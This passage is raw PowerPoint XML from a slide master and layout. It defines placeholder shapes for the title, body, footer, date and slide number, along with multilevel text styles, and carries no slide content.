          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr algn="ctr" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:tint val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr>
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Holder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="6"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609986" y="6377549"/>
            <a:ext cx="2803621" cy="276999"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr algn="l" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:tint val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{452B207D-E3D1-487A-AC7A-CAD8C9CD18B9}" type="datetimeFigureOut">
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
              </a:rPr>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>12-Dec-23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Holder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="7"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8778394" y="6377549"/>
            <a:ext cx="2803622" cy="276999"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" numCol="1" anchor="t" anchorCtr="0" compatLnSpc="1">
            <a:prstTxWarp prst="textNoShape">
              <a:avLst/>
            </a:prstTxWarp>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr algn="r" eaLnBrk="1" hangingPunct="1">
              <a:defRPr>
                <a:solidFill>
                  <a:srgbClr val="898989"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{EEE9C599-11F9-459F-BD2A-01D151B94A8E}" type="slidenum">
              <a:rPr lang="en-US" altLang="en-US">
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:pPr fontAlgn="base">
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
                <a:spcAft>
                  <a:spcPct val="0"/>
                </a:spcAft>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US">
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1278473416"/>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Lst>
  <p:txStyles>
    <p:titleStyle>
      <a:lvl1pPr algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="+mj-lt"/>
          <a:ea typeface="+mj-ea"/>
          <a:cs typeface="+mj-cs"/>
        </a:defRPr>
      </a:lvl1pPr>
      <a:lvl2pPr algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl2pPr>
      <a:lvl3pPr algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl3pPr>
      <a:lvl4pPr algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl4pPr>
      <a:lvl5pPr algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl5pPr>
      <a:lvl6pPr marL="402724" algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl6pPr>
      <a:lvl7pPr marL="805449" algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl7pPr>
      <a:lvl8pPr marL="1208171" algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl8pPr>
      <a:lvl9pPr marL="1610895" algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl9pPr>
    </p:titleStyle>
    <p:bodyStyle>
      <a:lvl1pPr marL="302575" indent="-302575" algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl1pPr>
      <a:lvl2pPr marL="400632" indent="2802" algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl2pPr>
      <a:lvl3pPr marL="804065" indent="2802" algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl3pPr>
      <a:lvl4pPr marL="1207498" indent="2802" algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl4pPr>
      <a:lvl5pPr marL="1608130" indent="5603" algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl5pPr>
      <a:lvl6pPr marL="2013621">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl6pPr>
      <a:lvl7pPr marL="2416346">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl7pPr>
      <a:lvl8pPr marL="2819070">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl8pPr>
      <a:lvl9pPr marL="3221792">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl9pPr>
    </p:bodyStyle>
    <p:otherStyle>
      <a:lvl1pPr marL="0">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl1pPr>
      <a:lvl2pPr marL="402724">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl2pPr>
      <a:lvl3pPr marL="805449">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl3pPr>
      <a:lvl4pPr marL="1208171">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl4pPr>
      <a:lvl5pPr marL="1610895">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl5pPr>
      <a:lvl6pPr marL="2013621">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl6pPr>
      <a:lvl7pPr marL="2416346">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl7pPr>
      <a:lvl8pPr marL="2819070">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl8pPr>
      <a:lvl9pPr marL="3221792">
        <a:defRPr>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Holder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="935182" y="717177"/>
            <a:ext cx="1032163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p>
            <a:pPr lvl="0"/>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Holder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1296940" y="2291603"/>
            <a:ext cx="9598121" cy="423193"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="2750" b="0" i="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Holder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4144818" y="6377549"/>
            <a:ext cx="3902364" cy="276999"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr algn="ctr" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:tint val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr>
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Holder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="6"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609986" y="6377549"/>
            <a:ext cx="2803621" cy="276999"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr algn="l" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:tint val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{452B207D-E3D1-487A-AC7A-CAD8C9CD18B9}" type="datetimeFigureOut">
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
              </a:rPr>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>12-Dec-23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Holder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="7"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8778394" y="6377549"/>
            <a:ext cx="2803622" cy="276999"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" numCol="1" anchor="t" anchorCtr="0" compatLnSpc="1">
            <a:prstTxWarp prst="textNoShape">
              <a:avLst/>
            </a:prstTxWarp>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr algn="r" eaLnBrk="1" hangingPunct="1">
              <a:defRPr>
                <a:solidFill>
                  <a:srgbClr val="898989"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{EEE9C599-11F9-459F-BD2A-01D151B94A8E}" type="slidenum">
              <a:rPr lang="en-US" altLang="en-US">
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:pPr fontAlgn="base">
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
                <a:spcAft>
                  <a:spcPct val="0"/>
                </a:spcAft>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US">
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="634712950"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMap bg1="lt1" tx1="dk1" bg2="lt2" tx2="dk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Lst>
  <p:txStyles>
    <p:titleStyle>
      <a:lvl1pPr algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="+mj-lt"/>
          <a:ea typeface="+mj-ea"/>
          <a:cs typeface="+mj-cs"/>
        </a:defRPr>
      </a:lvl1pPr>
      <a:lvl2pPr algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl2pPr>
      <a:lvl3pPr algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl3pPr>
      <a:lvl4pPr algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl4pPr>
      <a:lvl5pPr algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl5pPr>
      <a:lvl6pPr marL="402724" algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl6pPr>
      <a:lvl7pPr marL="805449" algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl7pPr>
      <a:lvl8pPr marL="1208171" algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl8pPr>
      <a:lvl9pPr marL="1610895" algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl9pPr>
    </p:titleStyle>
    <p:bodyStyle>
      <a:lvl1pPr marL="302575" indent="-302575" algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl1pPr>
      <a:lvl2pPr marL="400632" indent="2802" algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl2pPr>
      <a:lvl3pPr marL="804065" indent="2802" algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl3pPr>
      <a:lvl4pPr marL="1207498" indent="2802" algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl4pPr>
      <a:lvl5pPr marL="1608130" indent="5603" algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl5pPr>
      <a:lvl6pPr marL="2013621">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl6pPr>
      <a:lvl7pPr marL="2416346">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl7pPr>
      <a:lvl8pPr marL="2819070">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl8pPr>
      <a:lvl9pPr marL="3221792">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl9pPr>
